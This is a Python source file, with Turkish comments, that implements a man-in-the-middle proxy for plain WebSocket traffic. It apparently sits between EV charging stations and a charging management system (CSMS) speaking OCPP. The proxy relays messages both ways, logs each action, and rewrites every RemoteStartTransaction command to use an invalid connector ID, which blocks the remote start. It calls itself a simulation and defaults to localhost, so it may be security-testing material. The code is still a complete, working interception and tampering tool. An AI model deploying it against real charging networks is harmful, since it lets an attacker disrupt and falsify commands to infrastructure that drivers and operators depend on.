"""
MitM Proxy: Plain WebSocket için ortadaki adam saldırısı simülasyonu
"""

import asyncio
import logging
import json
from typing import Dict, Any
from datetime import datetime
import websockets
from websockets.client import WebSocketClientProtocol

logger = logging.getLogger(__name__)


class MitMProxy:
    """
    Ortadaki Adam Proxy
    
    Plain WebSocket trafiğini yakalayıp manipüle eder
    """
    
    def __init__(self,
                 proxy_port: int = 9090,
                 target_host: str = 'localhost',
                 target_port: int = 9000):
        """
        Args:
            proxy_port: Proxy dinleme portu
            target_host: Hedef CSMS host
            target_port: Hedef CSMS port
        """
        self.proxy_port = proxy_port
        self.target_host = target_host
        self.target_port = target_port
        self.running = False
        self.intercepted_messages = []
    
    async def start(self):
        """Proxy'yi başlat"""
        self.running = True
        
        logger.info(f"🎭 MitM Proxy başlatılıyor: port {self.proxy_port}")
        
        async with websockets.serve(
            self.handle_client,
            'localhost',
            self.proxy_port
        ):
            logger.info(f"✅ MitM Proxy hazır: ws://localhost:{self.proxy_port}")
            
            # Keep running
            await asyncio.Event().wait()
    
    async def handle_client(self, client_ws: WebSocketClientProtocol, path: str):
        """
        Client bağlantısını handle et ve forward et
        
        Args:
            client_ws: Client WebSocket
            path: Request path
        """
        client_addr = client_ws.remote_address
        logger.info(f"🔗 Yeni client bağlantısı: {client_addr}")
        
        # Hedef sunucuya bağlan
        target_url = f"ws://{self.target_host}:{self.target_port}{path}"
        
        try:
            async with websockets.connect(target_url) as server_ws:
                logger.info(f"✅ Hedef sunucuya bağlanıldı: {target_url}")
                
                # İki yönlü mesaj forward
                await asyncio.gather(
                    self._forward_messages(client_ws, server_ws, "Client→Server"),
                    self._forward_messages(server_ws, client_ws, "Server→Client")
                )
                
        except websockets.exceptions.ConnectionClosed:
            logger.info("🔌 Bağlantı kapandı")
        except Exception as e:
            logger.error(f"❌ Bağlantı hatası: {e}")
    
    async def _forward_messages(self, source: WebSocketClientProtocol,
                                destination: WebSocketClientProtocol,
                                direction: str):
        """
        Mesajları forward et ve manipüle et
        
        Args:
            source: Kaynak WebSocket
            destination: Hedef WebSocket
            direction: Yön bilgisi
        """
        try:
            async for message in source:
                # Mesajı intercept et
                intercepted = await self.intercept_message(message, direction)
                
                if intercepted:
                    # Manipüle edilmiş mesajı gönder
                    await destination.send(intercepted)
                else:
                    # Orijinal mesajı gönder
                    await destination.send(message)
                    
        except websockets.exceptions.ConnectionClosed:
            pass
        except Exception as e:
            logger.error(f"❌ Forward hatası: {e}")
    
    async def intercept_message(self, raw_message: str, direction: str) -> str:
        """
        Mesajı intercept et ve manipüle et
        
        Args:
            raw_message: Ham mesaj
            direction: Yön bilgisi
            
        Returns:
            str: Manipüle edilmiş mesaj (None = orijinal mesajı gönder)
        """
        try:
            message = json.loads(raw_message)
            action = message.get('action')
            
            # Mesajı logla
            logger.info(f"📥 {direction}: {action}")
            
            # Kritik mesajları manipüle et
            if action == 'RemoteStartTransaction':
                return self._modify_remote_start(message)
            
            # Mesajı kaydet
            self.intercepted_messages.append({
                'direction': direction,
                'action': action,
                'timestamp': datetime.now()
            })
            
            return None  # Orijinal mesajı gönder
            
        except json.JSONDecodeError:
            return None
    
    def _modify_remote_start(self, message: Dict[str, Any]) -> str:
        """
        RemoteStartTransaction mesajını manipüle et
        
        Örnek: Connector ID'yi değiştir veya komutu durdur
        """
        # Mesajı manipüle et
        modified = message.copy()
        if 'payload' in modified:
            modified['payload'] = modified['payload'].copy()
            # Örnek: Connector ID'yi 999 yap (geçersiz connector)
            modified['payload']['connectorId'] = 999
        
        logger.warning(f"⚠️  Mesaj manipüle edildi: RemoteStartTransaction")
        
        return json.dumps(modified)
    
    def get_stats(self) -> Dict[str, Any]:
        """İstatistikleri döndür"""
        return {
            'running': self.running,
            'intercepted_messages': len(self.intercepted_messages),
            'recent_interceptions': self.intercepted_messages[-10:]
        }


async def main():
    """Ana fonksiyon"""
    from datetime import datetime
    
    import argparse
    
    parser = argparse.ArgumentParser(description='MitM Proxy')
    parser.add_argument('--proxy-port', type=int, default=9090, help='Proxy port')
    parser.add_argument('--target-host', default='localhost', help='Target host')
    parser.add_argument('--target-port', type=int, default=9000, help='Target port')
    parser.add_argument('--log-level', default='INFO', help='Log level')
    
    args = parser.parse_args()
    
    logging.basicConfig(
        level=getattr(logging, args.log_level.upper()),
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    proxy = MitMProxy(
        proxy_port=args.proxy_port,
        target_host=args.target_host,
        target_port=args.target_port
    )
    
    try:
        await proxy.start()
    except KeyboardInterrupt:
        logger.info("⏹️  Proxy durduruluyor...")


if __name__ == '__main__':
    asyncio.run(main())

